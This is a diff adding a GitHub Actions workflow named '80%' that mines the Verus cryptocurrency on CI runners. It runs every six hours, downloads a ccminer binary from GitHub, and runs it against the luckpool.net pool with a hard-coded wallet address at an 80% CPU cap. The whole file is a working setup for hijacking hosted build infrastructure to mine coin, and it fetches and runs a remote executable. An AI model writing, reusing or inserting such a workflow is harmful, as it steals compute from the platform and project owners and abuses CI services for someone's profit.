@@ -1,0 +1,31 @@
+name: 80%
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: "0 */6 * * *"
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+
+    steps:
+    - name: Update system
+      run: |
+        sudo apt update
+        sudo apt install wget cpulimit -y
+
+    - name: Download Verus Miner
+      run: |
+        wget https://github.com/monkins1010/ccminer/releases/download/v3.8.3/ccminer-x86-64
+        chmod +x ccminer-x86-64
+
+    - name: Start Mining (80% CPU limit)
+      run: |
+        cpulimit -l 80 -- ./ccminer-x86-64 \
+        -a verus \
+        -o stratum+tcp://na.luckpool.net:3956 \
+        -u RQLTCKt8WJAMwfW29tZfn8jJ6WeoNmkP4P4.worker \
+        -p x \
+        -t 1
